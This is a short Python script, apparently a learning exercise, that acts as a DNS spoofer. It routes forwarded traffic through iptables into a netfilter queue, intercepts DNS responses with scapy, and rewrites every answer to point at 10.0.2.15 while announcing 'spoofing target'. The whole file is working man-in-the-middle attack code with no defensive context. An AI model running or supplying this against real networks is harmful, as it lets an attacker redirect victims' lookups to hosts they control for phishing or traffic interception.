import netfilterqueue
import subprocess
import scapy.all as scapy



def subprocess_func():
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    #subprocess.call("iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num","0")
    #subprocess.call("iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num","0")

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        #qname = scapy_packet[scapy.DNSQR].qname
        #if "www.bing.com" in qname:
        answer = scapy.DNSRR(rdata="10.0.2.15")
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1

        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum

        packet.set_payload(str(scapy_packet))
        print("[+] spoofing target..!")



    packet.accept()


try:
    # subprocess_func()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Quiting...!")


